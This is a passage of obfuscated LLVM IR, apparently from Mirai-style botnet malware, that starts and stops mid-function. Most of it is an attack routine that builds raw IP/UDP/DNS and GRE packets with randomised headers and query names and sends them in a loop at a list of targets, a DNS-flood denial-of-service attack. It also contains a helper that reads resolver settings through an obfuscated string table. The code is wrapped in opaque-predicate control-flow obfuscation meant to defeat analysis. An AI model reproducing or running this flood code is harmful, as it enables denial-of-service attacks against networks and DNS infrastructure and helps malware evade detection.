  %290 = load i8, i8* %35, align 1
  %291 = load i8*, i8** %41, align 8
  store i8 %290, i8* %291, align 1
  store i8 0, i8* %35, align 1
  %292 = load i8, i8* %36, align 1
  %293 = add i8 %292, 1
  store i8 %293, i8* %36, align 1
  %294 = load i8*, i8** %40, align 8
  %295 = load i32, i32* %34, align 4
  %296 = sext i32 %295 to i64
  %297 = getelementptr inbounds i8, i8* %294, i64 %296
  %298 = getelementptr inbounds i8, i8* %297, i64 1
  store i8* %298, i8** %41, align 8
  %299 = load i32, i32* @x.31
  %300 = load i32, i32* @y.32
  %301 = sub i32 %299, 1
  %302 = mul i32 %299, %301
  %303 = urem i32 %302, 2
  %304 = icmp eq i32 %303, 0
  %305 = icmp slt i32 %300, 10
  %306 = or i1 %304, %305
  br i1 %306, label %originalBBpart222, label %originalBB10alteredBB

originalBBpart222:                                ; preds = %originalBB10
  br label %310

; <label>:307:                                    ; preds = %273
  %308 = load i8, i8* %35, align 1
  %309 = add i8 %308, 1
  store i8 %309, i8* %35, align 1
  br label %310

; <label>:310:                                    ; preds = %307, %originalBBpart222
  br label %311

; <label>:311:                                    ; preds = %310
  %312 = load i32, i32* %34, align 4
  %313 = add nsw i32 %312, 1
  store i32 %313, i32* %34, align 4
  br label %269

; <label>:314:                                    ; preds = %269
  %315 = load i8, i8* %35, align 1
  %316 = load i8*, i8** %41, align 8
  store i8 %315, i8* %316, align 1
  %317 = load i8*, i8** %40, align 8
  %318 = load i32, i32* %31, align 4
  %319 = sext i32 %318 to i64
  %320 = getelementptr inbounds i8, i8* %317, i64 %319
  %321 = getelementptr inbounds i8, i8* %320, i64 2
  %322 = bitcast i8* %321 to %struct.grehdr*
  store %struct.grehdr* %322, %struct.grehdr** %42, align 8
  %323 = call zeroext i16 @htons(i16 zeroext 1) #7
  %324 = load %struct.grehdr*, %struct.grehdr** %42, align 8
  %325 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %324, i32 0, i32 0
  store i16 %323, i16* %325, align 2
  %326 = call zeroext i16 @htons(i16 zeroext 1) #7
  %327 = load %struct.grehdr*, %struct.grehdr** %42, align 8
  %328 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %327, i32 0, i32 1
  store i16 %326, i16* %328, align 2
  br label %329

; <label>:329:                                    ; preds = %314
  %330 = load i32, i32* %19, align 4
  %331 = add nsw i32 %330, 1
  store i32 %331, i32* %19, align 4
  br label %152

; <label>:332:                                    ; preds = %152
  %333 = load i32, i32* @x.31
  %334 = load i32, i32* @y.32
  %335 = sub i32 %333, 1
  %336 = mul i32 %333, %335
  %337 = urem i32 %336, 2
  %338 = icmp eq i32 %337, 0
  %339 = icmp slt i32 %334, 10
  %340 = or i1 %338, %339
  br i1 %340, label %originalBB24, label %originalBB24alteredBB

originalBB24:                                     ; preds = %originalBB24alteredBB, %332
  %341 = load i32, i32* @x.31
  %342 = load i32, i32* @y.32
  %343 = sub i32 %341, 1
  %344 = mul i32 %341, %343
  %345 = urem i32 %344, 2
  %346 = icmp eq i32 %345, 0
  %347 = icmp slt i32 %342, 10
  %348 = or i1 %346, %347
  br i1 %348, label %originalBBpart227, label %originalBB24alteredBB

originalBBpart227:                                ; preds = %originalBB24
  br label %349

; <label>:349:                                    ; preds = %originalBBpart269, %originalBBpart227
  store i32 0, i32* %19, align 4
  br label %350

; <label>:350:                                    ; preds = %516, %349
  %351 = load i32, i32* %19, align 4
  %352 = load i8, i8* %15, align 1
  %353 = zext i8 %352 to i32
  %354 = icmp slt i32 %351, %353
  br i1 %354, label %355, label %519

; <label>:355:                                    ; preds = %350
  %356 = load i8**, i8*** %21, align 8
  %357 = load i32, i32* %19, align 4
  %358 = sext i32 %357 to i64
  %359 = getelementptr inbounds i8*, i8** %356, i64 %358
  %360 = load i8*, i8** %359, align 8
  store i8* %360, i8** %43, align 8
  %361 = load i8*, i8** %43, align 8
  %362 = bitcast i8* %361 to %struct.iphdr*
  store %struct.iphdr* %362, %struct.iphdr** %44, align 8
  %363 = load %struct.iphdr*, %struct.iphdr** %44, align 8
  %364 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %363, i64 1
  %365 = bitcast %struct.iphdr* %364 to %struct.udphdr*
  store %struct.udphdr* %365, %struct.udphdr** %45, align 8
  %366 = load %struct.udphdr*, %struct.udphdr** %45, align 8
  %367 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %366, i64 1
  %368 = bitcast %struct.udphdr* %367 to %struct.dnshdr*
  store %struct.dnshdr* %368, %struct.dnshdr** %46, align 8
  %369 = load %struct.dnshdr*, %struct.dnshdr** %46, align 8
  %370 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %369, i64 1
  %371 = bitcast %struct.dnshdr* %370 to i8*
  %372 = getelementptr inbounds i8, i8* %371, i64 1
  store i8* %372, i8** %47, align 8
  %373 = load i16, i16* %23, align 2
  %374 = zext i16 %373 to i32
  %375 = icmp eq i32 %374, 65535
  br i1 %375, label %376, label %398

; <label>:376:                                    ; preds = %355
  %377 = load i32, i32* @x.31
  %378 = load i32, i32* @y.32
  %379 = sub i32 %377, 1
  %380 = mul i32 %377, %379
  %381 = urem i32 %380, 2
  %382 = icmp eq i32 %381, 0
  %383 = icmp slt i32 %378, 10
  %384 = or i1 %382, %383
  br i1 %384, label %originalBB29, label %originalBB29alteredBB

originalBB29:                                     ; preds = %originalBB29alteredBB, %376
  %385 = call i32 @rand_next()
  %386 = and i32 %385, 65535
  %387 = trunc i32 %386 to i16
  %388 = load %struct.iphdr*, %struct.iphdr** %44, align 8
  %389 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %388, i32 0, i32 3
  store i16 %387, i16* %389, align 4
  %390 = load i32, i32* @x.31
  %391 = load i32, i32* @y.32
  %392 = sub i32 %390, 1
  %393 = mul i32 %390, %392
  %394 = urem i32 %393, 2
  %395 = icmp eq i32 %394, 0
  %396 = icmp slt i32 %391, 10
  %397 = or i1 %395, %396
  br i1 %397, label %originalBBpart239, label %originalBB29alteredBB

originalBBpart239:                                ; preds = %originalBB29
  br label %398

; <label>:398:                                    ; preds = %originalBBpart239, %355
  %399 = load i16, i16* %26, align 2
  %400 = zext i16 %399 to i32
  %401 = icmp eq i32 %400, 65535
  br i1 %401, label %402, label %424

; <label>:402:                                    ; preds = %398
  %403 = load i32, i32* @x.31
  %404 = load i32, i32* @y.32
  %405 = sub i32 %403, 1
  %406 = mul i32 %403, %405
  %407 = urem i32 %406, 2
  %408 = icmp eq i32 %407, 0
  %409 = icmp slt i32 %404, 10
  %410 = or i1 %408, %409
  br i1 %410, label %originalBB41, label %originalBB41alteredBB

originalBB41:                                     ; preds = %originalBB41alteredBB, %402
  %411 = call i32 @rand_next()
  %412 = and i32 %411, 65535
  %413 = trunc i32 %412 to i16
  %414 = load %struct.udphdr*, %struct.udphdr** %45, align 8
  %415 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %414, i32 0, i32 0
  store i16 %413, i16* %415, align 2
  %416 = load i32, i32* @x.31
  %417 = load i32, i32* @y.32
  %418 = sub i32 %416, 1
  %419 = mul i32 %416, %418
  %420 = urem i32 %419, 2
  %421 = icmp eq i32 %420, 0
  %422 = icmp slt i32 %417, 10
  %423 = or i1 %421, %422
  br i1 %423, label %originalBBpart257, label %originalBB41alteredBB

originalBBpart257:                                ; preds = %originalBB41
  br label %424

; <label>:424:                                    ; preds = %originalBBpart257, %398
  %425 = load i16, i16* %27, align 2
  %426 = zext i16 %425 to i32
  %427 = icmp eq i32 %426, 65535
  br i1 %427, label %428, label %434

; <label>:428:                                    ; preds = %424
  %429 = call i32 @rand_next()
  %430 = and i32 %429, 65535
  %431 = trunc i32 %430 to i16
  %432 = load %struct.udphdr*, %struct.udphdr** %45, align 8
  %433 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %432, i32 0, i32 1
  store i16 %431, i16* %433, align 2
  br label %434

; <label>:434:                                    ; preds = %428, %424
  %435 = load i16, i16* %28, align 2
  %436 = zext i16 %435 to i32
  %437 = icmp eq i32 %436, 65535
  br i1 %437, label %438, label %444

; <label>:438:                                    ; preds = %434
  %439 = call i32 @rand_next()
  %440 = and i32 %439, 65535
  %441 = trunc i32 %440 to i16
  %442 = load %struct.dnshdr*, %struct.dnshdr** %46, align 8
  %443 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %442, i32 0, i32 0
  store i16 %441, i16* %443, align 2
  br label %444

; <label>:444:                                    ; preds = %438, %434
  %445 = load i8*, i8** %47, align 8
  %446 = load i8, i8* %29, align 1
  %447 = zext i8 %446 to i32
  call void @rand_alpha_str(i8* %445, i32 %447)
  %448 = load i8*, i8** %47, align 8
  %449 = load i8, i8* %29, align 1
  %450 = zext i8 %449 to i64
  %451 = getelementptr inbounds i8, i8* %448, i64 %450
  store i8 0, i8* %451, align 1
  %452 = load %struct.iphdr*, %struct.iphdr** %44, align 8
  %453 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %452, i32 0, i32 7
  store i16 0, i16* %453, align 2
  %454 = load %struct.iphdr*, %struct.iphdr** %44, align 8
  %455 = bitcast %struct.iphdr* %454 to i16*
  %456 = call zeroext i16 @checksum_generic(i16* %455, i32 20)
  %457 = load %struct.iphdr*, %struct.iphdr** %44, align 8
  %458 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %457, i32 0, i32 7
  store i16 %456, i16* %458, align 2
  %459 = load %struct.udphdr*, %struct.udphdr** %45, align 8
  %460 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %459, i32 0, i32 3
  store i16 0, i16* %460, align 2
  %461 = load %struct.iphdr*, %struct.iphdr** %44, align 8
  %462 = load %struct.udphdr*, %struct.udphdr** %45, align 8
  %463 = bitcast %struct.udphdr* %462 to i8*
  %464 = load %struct.udphdr*, %struct.udphdr** %45, align 8
  %465 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %464, i32 0, i32 2
  %466 = load i16, i16* %465, align 2
  %467 = load i8, i8* %29, align 1
  %468 = zext i8 %467 to i64
  %469 = add i64 21, %468
  %470 = add i64 %469, 2
  %471 = load i32, i32* %31, align 4
  %472 = sext i32 %471 to i64
  %473 = add i64 %470, %472
  %474 = add i64 %473, 4
  %475 = trunc i64 %474 to i32
  %476 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %461, i8* %463, i16 zeroext %466, i32 %475)
  %477 = load %struct.udphdr*, %struct.udphdr** %45, align 8
  %478 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %477, i32 0, i32 3
  store i16 %476, i16* %478, align 2
  %479 = load i32, i32* %32, align 4
  %480 = load %struct.attack_target*, %struct.attack_target** %16, align 8
  %481 = load i32, i32* %19, align 4
  %482 = sext i32 %481 to i64
  %483 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %480, i64 %482
  %484 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %483, i32 0, i32 0
  %485 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %484, i32 0, i32 2
  %486 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %485, i32 0, i32 0
  store i32 %479, i32* %486, align 4
  %487 = load %struct.udphdr*, %struct.udphdr** %45, align 8
  %488 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %487, i32 0, i32 1
  %489 = load i16, i16* %488, align 2
  %490 = load %struct.attack_target*, %struct.attack_target** %16, align 8
  %491 = load i32, i32* %19, align 4
  %492 = sext i32 %491 to i64
  %493 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %490, i64 %492
  %494 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %493, i32 0, i32 0
  %495 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %494, i32 0, i32 1
  store i16 %489, i16* %495, align 2
  %496 = load i32, i32* %20, align 4
  %497 = load i8*, i8** %43, align 8
  %498 = load i8, i8* %29, align 1
  %499 = zext i8 %498 to i64
  %500 = add i64 41, %499
  %501 = add i64 %500, 2
  %502 = load i32, i32* %31, align 4
  %503 = sext i32 %502 to i64
  %504 = add i64 %501, %503
  %505 = add i64 %504, 4
  %506 = bitcast %union.__CONST_SOCKADDR_ARG* %48 to %struct.sockaddr**
  %507 = load %struct.attack_target*, %struct.attack_target** %16, align 8
  %508 = load i32, i32* %19, align 4
  %509 = sext i32 %508 to i64
  %510 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %507, i64 %509
  %511 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %510, i32 0, i32 0
  %512 = bitcast %struct.sockaddr_in* %511 to %struct.sockaddr*
  store %struct.sockaddr* %512, %struct.sockaddr** %506, align 8
  %513 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %48, i32 0, i32 0
  %514 = load %struct.sockaddr*, %struct.sockaddr** %513, align 8
  %515 = call i64 @sendto(i32 %496, i8* %497, i64 %505, i32 16384, %struct.sockaddr* %514, i32 16)
  br label %516

; <label>:516:                                    ; preds = %444
  %517 = load i32, i32* %19, align 4
  %518 = add nsw i32 %517, 1
  store i32 %518, i32* %19, align 4
  br label %350

; <label>:519:                                    ; preds = %350
  %520 = load i32, i32* @x.31
  %521 = load i32, i32* @y.32
  %522 = sub i32 %520, 1
  %523 = mul i32 %520, %522
  %524 = urem i32 %523, 2
  %525 = icmp eq i32 %524, 0
  %526 = icmp slt i32 %521, 10
  %527 = or i1 %525, %526
  br i1 %527, label %originalBB59, label %originalBB59alteredBB

originalBB59:                                     ; preds = %originalBB59alteredBB, %519
  %528 = call i64 @time(i64* null) #6
  %529 = load i32, i32* %33, align 4
  %530 = sext i32 %529 to i64
  %531 = icmp sgt i64 %528, %530
  %532 = load i32, i32* @x.31
  %533 = load i32, i32* @y.32
  %534 = sub i32 %532, 1
  %535 = mul i32 %532, %534
  %536 = urem i32 %535, 2
  %537 = icmp eq i32 %536, 0
  %538 = icmp slt i32 %533, 10
  %539 = or i1 %537, %538
  br i1 %539, label %originalBBpart261, label %originalBB59alteredBB

originalBBpart261:                                ; preds = %originalBB59
  br i1 %531, label %540, label %557

; <label>:540:                                    ; preds = %originalBBpart261
  %541 = load i32, i32* @x.31
  %542 = load i32, i32* @y.32
  %543 = sub i32 %541, 1
  %544 = mul i32 %541, %543
  %545 = urem i32 %544, 2
  %546 = icmp eq i32 %545, 0
  %547 = icmp slt i32 %542, 10
  %548 = or i1 %546, %547
  br i1 %548, label %originalBB63, label %originalBB63alteredBB

originalBB63:                                     ; preds = %originalBB63alteredBB, %540
  %549 = load i32, i32* @x.31
  %550 = load i32, i32* @y.32
  %551 = sub i32 %549, 1
  %552 = mul i32 %549, %551
  %553 = urem i32 %552, 2
  %554 = icmp eq i32 %553, 0
  %555 = icmp slt i32 %550, 10
  %556 = or i1 %554, %555
  br i1 %556, label %originalBBpart265, label %originalBB63alteredBB

originalBBpart265:                                ; preds = %originalBB63
  br label %574

; <label>:557:                                    ; preds = %originalBBpart261
  %558 = load i32, i32* @x.31
  %559 = load i32, i32* @y.32
  %560 = sub i32 %558, 1
  %561 = mul i32 %558, %560
  %562 = urem i32 %561, 2
  %563 = icmp eq i32 %562, 0
  %564 = icmp slt i32 %559, 10
  %565 = or i1 %563, %564
  br i1 %565, label %originalBB67, label %originalBB67alteredBB

originalBB67:                                     ; preds = %originalBB67alteredBB, %557
  %566 = load i32, i32* @x.31
  %567 = load i32, i32* @y.32
  %568 = sub i32 %566, 1
  %569 = mul i32 %566, %568
  %570 = urem i32 %569, 2
  %571 = icmp eq i32 %570, 0
  %572 = icmp slt i32 %567, 10
  %573 = or i1 %571, %572
  br i1 %573, label %originalBBpart269, label %originalBB67alteredBB

originalBBpart269:                                ; preds = %originalBB67
  br label %349

; <label>:574:                                    ; preds = %originalBBpart265, %132, %126, %104
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %5
  %575 = alloca i32, align 4
  %576 = alloca i8, align 1
  %577 = alloca %struct.attack_target*, align 8
  %578 = alloca i8, align 1
  %579 = alloca %struct.attack_option*, align 8
  %580 = alloca i32, align 4
  %581 = alloca i32, align 4
  %582 = alloca i8**, align 8
  %583 = alloca i8, align 1
  %584 = alloca i16, align 2
  %585 = alloca i8, align 1
  %586 = alloca i8, align 1
  %587 = alloca i16, align 2
  %588 = alloca i16, align 2
  %589 = alloca i16, align 2
  %590 = alloca i8, align 1
  %591 = alloca i8*, align 8
  %592 = alloca i32, align 4
  %593 = alloca i32, align 4
  %594 = alloca i32, align 4
  %595 = alloca i32, align 4
  %596 = alloca i8, align 1
  %597 = alloca i8, align 1
  %598 = alloca %struct.iphdr*, align 8
  %599 = alloca %struct.udphdr*, align 8
  %600 = alloca %struct.dnshdr*, align 8
  %601 = alloca i8*, align 8
  %602 = alloca i8*, align 8
  %603 = alloca %struct.grehdr*, align 8
  %604 = alloca i8*, align 8
  %605 = alloca %struct.iphdr*, align 8
  %606 = alloca %struct.udphdr*, align 8
  %607 = alloca %struct.dnshdr*, align 8
  %608 = alloca i8*, align 8
  %609 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %575, align 4
  store i8 %1, i8* %576, align 1
  store %struct.attack_target* %2, %struct.attack_target** %577, align 8
  store i8 %3, i8* %578, align 1
  store %struct.attack_option* %4, %struct.attack_option** %579, align 8
  store i32 0, i32* %580, align 4
  store i32 0, i32* %581, align 4
  %610 = load i8, i8* %576, align 1
  %611 = zext i8 %610 to i64
  %612 = call noalias i8* @calloc(i64 %611, i64 8) #6
  %613 = bitcast i8* %612 to i8**
  store i8** %613, i8*** %582, align 8
  %614 = load i8, i8* %578, align 1
  %615 = load %struct.attack_option*, %struct.attack_option** %579, align 8
  %616 = call i32 @attack_get_opt_int(i8 zeroext %614, %struct.attack_option* %615, i8 zeroext 2, i32 0)
  %617 = trunc i32 %616 to i8
  store i8 %617, i8* %583, align 1
  %618 = load i8, i8* %578, align 1
  %619 = load %struct.attack_option*, %struct.attack_option** %579, align 8
  %620 = call i32 @attack_get_opt_int(i8 zeroext %618, %struct.attack_option* %619, i8 zeroext 3, i32 65535)
  %621 = trunc i32 %620 to i16
  store i16 %621, i16* %584, align 2
  %622 = load i8, i8* %578, align 1
  %623 = load %struct.attack_option*, %struct.attack_option** %579, align 8
  %624 = call i32 @attack_get_opt_int(i8 zeroext %622, %struct.attack_option* %623, i8 zeroext 4, i32 64)
  %625 = trunc i32 %624 to i8
  store i8 %625, i8* %585, align 1
  %626 = load i8, i8* %578, align 1
  %627 = load %struct.attack_option*, %struct.attack_option** %579, align 8
  %628 = call i32 @attack_get_opt_int(i8 zeroext %626, %struct.attack_option* %627, i8 zeroext 5, i32 0)
  %629 = trunc i32 %628 to i8
  store i8 %629, i8* %586, align 1
  %630 = load i8, i8* %578, align 1
  %631 = load %struct.attack_option*, %struct.attack_option** %579, align 8
  %632 = call i32 @attack_get_opt_int(i8 zeroext %630, %struct.attack_option* %631, i8 zeroext 6, i32 65535)
  %633 = trunc i32 %632 to i16
  store i16 %633, i16* %587, align 2
  %634 = load i8, i8* %578, align 1
  %635 = load %struct.attack_option*, %struct.attack_option** %579, align 8
  %636 = call i32 @attack_get_opt_int(i8 zeroext %634, %struct.attack_option* %635, i8 zeroext 7, i32 53)
  %637 = trunc i32 %636 to i16
  store i16 %637, i16* %588, align 2
  %638 = load i8, i8* %578, align 1
  %639 = load %struct.attack_option*, %struct.attack_option** %579, align 8
  %640 = call i32 @attack_get_opt_int(i8 zeroext %638, %struct.attack_option* %639, i8 zeroext 9, i32 65535)
  %641 = trunc i32 %640 to i16
  store i16 %641, i16* %589, align 2
  %642 = load i8, i8* %578, align 1
  %643 = load %struct.attack_option*, %struct.attack_option** %579, align 8
  %644 = call i32 @attack_get_opt_int(i8 zeroext %642, %struct.attack_option* %643, i8 zeroext 0, i32 12)
  %645 = trunc i32 %644 to i8
  store i8 %645, i8* %590, align 1
  %646 = load i8, i8* %578, align 1
  %647 = load %struct.attack_option*, %struct.attack_option** %579, align 8
  %648 = call i8* @attack_get_opt_str(i8 zeroext %646, %struct.attack_option* %647, i8 zeroext 8, i8* null)
  store i8* %648, i8** %591, align 8
  store i32 0, i32* %592, align 4
  %649 = call i32 @get_dns_resolver()
  store i32 %649, i32* %593, align 4
  %650 = call i64 @time(i64* null) #6
  %651 = load i32, i32* %575, align 4
  %652 = sext i32 %651 to i64
  %653 = add nsw i64 %650, %652
  %654 = trunc i64 %653 to i32
  store i32 %654, i32* %594, align 4
  %655 = load i8*, i8** %591, align 8
  %656 = icmp eq i8* %655, null
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %105
  %657 = load i8*, i8** %30, align 8
  %658 = call i32 @util_strlen(i8* %657)
  store i32 %658, i32* %31, align 4
  %659 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %659, i32* %20, align 4
  %660 = icmp eq i32 %659, -1
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %135
  store i32 0, i32* %19, align 4
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %281
  %661 = load i8, i8* %35, align 1
  %662 = load i8*, i8** %41, align 8
  store i8 %661, i8* %662, align 1
  store i8 0, i8* %35, align 1
  %663 = load i8, i8* %36, align 1
  %_ = shl i8 %663, 1
  %_11 = sub i8 %663, 1
  %gen = mul i8 %_11, 1
  %_12 = shl i8 %663, 1
  %_13 = sub i8 0, %663
  %gen14 = add i8 %_13, 1
  %_15 = sub i8 %663, 1
  %gen16 = mul i8 %_15, 1
  %_17 = sub i8 0, %663
  %gen18 = add i8 %_17, 1
  %_19 = sub i8 %663, 1
  %gen20 = mul i8 %_19, 1
  %664 = add i8 %663, 1
  store i8 %664, i8* %36, align 1
  %665 = load i8*, i8** %40, align 8
  %666 = load i32, i32* %34, align 4
  %667 = sext i32 %666 to i64
  %668 = getelementptr inbounds i8, i8* %665, i64 %667
  %669 = getelementptr inbounds i8, i8* %668, i64 1
  store i8* %669, i8** %41, align 8
  br label %originalBB10

originalBB24alteredBB:                            ; preds = %originalBB24, %332
  br label %originalBB24

originalBB29alteredBB:                            ; preds = %originalBB29, %376
  %670 = call i32 @rand_next()
  %_30 = sub i32 %670, 65535
  %gen31 = mul i32 %_30, 65535
  %_32 = sub i32 0, %670
  %gen33 = add i32 %_32, 65535
  %_34 = sub i32 0, %670
  %gen35 = add i32 %_34, 65535
  %_36 = sub i32 0, %670
  %gen37 = add i32 %_36, 65535
  %671 = and i32 %670, 65535
  %672 = trunc i32 %671 to i16
  %673 = load %struct.iphdr*, %struct.iphdr** %44, align 8
  %674 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %673, i32 0, i32 3
  store i16 %672, i16* %674, align 4
  br label %originalBB29

originalBB41alteredBB:                            ; preds = %originalBB41, %402
  %675 = call i32 @rand_next()
  %_42 = sub i32 %675, 65535
  %gen43 = mul i32 %_42, 65535
  %_44 = sub i32 %675, 65535
  %gen45 = mul i32 %_44, 65535
  %_46 = shl i32 %675, 65535
  %_47 = sub i32 %675, 65535
  %gen48 = mul i32 %_47, 65535
  %_49 = sub i32 0, %675
  %gen50 = add i32 %_49, 65535
  %_51 = sub i32 %675, 65535
  %gen52 = mul i32 %_51, 65535
  %_53 = sub i32 %675, 65535
  %gen54 = mul i32 %_53, 65535
  %_55 = shl i32 %675, 65535
  %676 = and i32 %675, 65535
  %677 = trunc i32 %676 to i16
  %678 = load %struct.udphdr*, %struct.udphdr** %45, align 8
  %679 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %678, i32 0, i32 0
  store i16 %677, i16* %679, align 2
  br label %originalBB41

originalBB59alteredBB:                            ; preds = %originalBB59, %519
  %680 = call i64 @time(i64* null) #6
  %681 = load i32, i32* %33, align 4
  %682 = sext i32 %681 to i64
  %683 = icmp sgt i64 %680, %682
  br label %originalBB59

originalBB63alteredBB:                            ; preds = %originalBB63, %540
  br label %originalBB63

originalBB67alteredBB:                            ; preds = %originalBB67, %557
  br label %originalBB67
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @get_dns_resolver() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca [2048 x i8], align 16
  %6 = alloca i32, align 4
  %7 = alloca [32 x i8], align 16
  %8 = alloca i8, align 1
  %9 = alloca i8, align 1
  %10 = alloca i8, align 1
  store i32 0, i32* %2, align 4
  call void @table_unlock_val(i8 zeroext 37)
  %11 = call i8* @table_retrieve_val(i32 37, i32* null)
  %12 = call i32 (i8*, i32, ...) @open(i8* %11, i32 0)
  store i32 %12, i32* %2, align 4
  call void @table_lock_val(i8 zeroext 37)
  %13 = load i32, i32* %2, align 4
  %14 = icmp sge i32 %13, 0
  br i1 %14, label %15, label %143

; <label>:15:                                     ; preds = %0
  %16 = load i32, i32* @x.33
  %17 = load i32, i32* @y.34
  %18 = sub i32 %16, 1
  %19 = mul i32 %16, %18
  %20 = urem i32 %19, 2
  %21 = icmp eq i32 %20, 0
  %22 = icmp slt i32 %17, 10
  %23 = or i1 %21, %22
  br i1 %23, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %15
  store i32 0, i32* %3, align 4
  store i32 0, i32* %4, align 4
  %24 = load i32, i32* %2, align 4
  %25 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %26 = call i64 @read(i32 %24, i8* %25, i64 2048)
  %27 = trunc i64 %26 to i32
  store i32 %27, i32* %3, align 4
  %28 = load i32, i32* %2, align 4
  %29 = call i32 @close(i32 %28)
  call void @table_unlock_val(i8 zeroext 38)
  %30 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %31 = load i32, i32* %3, align 4
  %32 = call i8* @table_retrieve_val(i32 38, i32* null)
  %33 = call i32 @util_stristr(i8* %30, i32 %31, i8* %32)
  store i32 %33, i32* %4, align 4
  call void @table_lock_val(i8 zeroext 38)
  %34 = load i32, i32* %4, align 4
  %35 = icmp ne i32 %34, -1
  %36 = load i32, i32* @x.33
  %37 = load i32, i32* @y.34
  %38 = sub i32 %36, 1
  %39 = mul i32 %36, %38
  %40 = urem i32 %39, 2
  %41 = icmp eq i32 %40, 0
  %42 = icmp slt i32 %37, 10
  %43 = or i1 %41, %42
  br i1 %43, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %35, label %44, label %142

; <label>:44:                                     ; preds = %originalBBpart2
  store i32 0, i32* %6, align 4
  store i8 0, i8* %8, align 1
  store i8 0, i8* %9, align 1
  %45 = load i32, i32* %4, align 4
  store i32 %45, i32* %6, align 4
  br label %46

; <label>:46:                                     ; preds = %132, %44
  %47 = load i32, i32* %6, align 4
  %48 = load i32, i32* %3, align 4
  %49 = icmp slt i32 %47, %48
  br i1 %49, label %50, label %135

; <label>:50:                                     ; preds = %46
  %51 = load i32, i32* %6, align 4
  %52 = sext i32 %51 to i64
  %53 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i64 0, i64 %52
  %54 = load i8, i8* %53, align 1
  store i8 %54, i8* %10, align 1
  %55 = load i8, i8* %8, align 1
  %56 = icmp ne i8 %55, 0
  br i1 %56, label %68, label %57

; <label>:57:                                     ; preds = %50
  %58 = load i8, i8* %10, align 1
  %59 = sext i8 %58 to i32
  %60 = icmp eq i32 %59, 32
  br i1 %60, label %65, label %61

; <label>:61:                                     ; preds = %57
  %62 = load i8, i8* %10, align 1
  %63 = sext i8 %62 to i32
  %64 = icmp eq i32 %63, 9
  br i1 %64, label %65, label %66

; <label>:65:                                     ; preds = %61, %57
  br label %132

; <label>:66:                                     ; preds = %61
  store i8 1, i8* %8, align 1
  br label %67

; <label>:67:                                     ; preds = %66
  br label %68

; <label>:68:                                     ; preds = %67, %50
  %69 = load i32, i32* @x.33
  %70 = load i32, i32* @y.34
  %71 = sub i32 %69, 1
  %72 = mul i32 %69, %71
  %73 = urem i32 %72, 2
  %74 = icmp eq i32 %73, 0
  %75 = icmp slt i32 %70, 10
  %76 = or i1 %74, %75
  br i1 %76, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %68
  %77 = load i8, i8* %10, align 1
  %78 = sext i8 %77 to i32
  %79 = icmp ne i32 %78, 46
  %80 = load i32, i32* @x.33
  %81 = load i32, i32* @y.34
  %82 = sub i32 %80, 1
  %83 = mul i32 %80, %82
  %84 = urem i32 %83, 2
  %85 = icmp eq i32 %84, 0
  %86 = icmp slt i32 %81, 10
  %87 = or i1 %85, %86
  br i1 %87, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %79, label %88, label %96

; <label>:88:                                     ; preds = %originalBBpart24
  %89 = load i8, i8* %10, align 1
  %90 = sext i8 %89 to i32
  %91 = icmp slt i32 %90, 48
  br i1 %91, label %117, label %92

; <label>:92:                                     ; preds = %88
  %93 = load i8, i8* %10, align 1
  %94 = sext i8 %93 to i32
  %95 = icmp sgt i32 %94, 57
  br i1 %95, label %117, label %96

; <label>:96:                                     ; preds = %92, %originalBBpart24
  %97 = load i32, i32* @x.33
  %98 = load i32, i32* @y.34
  %99 = sub i32 %97, 1
  %100 = mul i32 %97, %99
  %101 = urem i32 %100, 2
  %102 = icmp eq i32 %101, 0
  %103 = icmp slt i32 %98, 10
  %104 = or i1 %102, %103
  br i1 %104, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %96
  %105 = load i32, i32* %6, align 4
  %106 = load i32, i32* %3, align 4
  %107 = sub nsw i32 %106, 1
  %108 = icmp eq i32 %105, %107
  %109 = load i32, i32* @x.33
  %110 = load i32, i32* @y.34
  %111 = sub i32 %109, 1
  %112 = mul i32 %109, %111
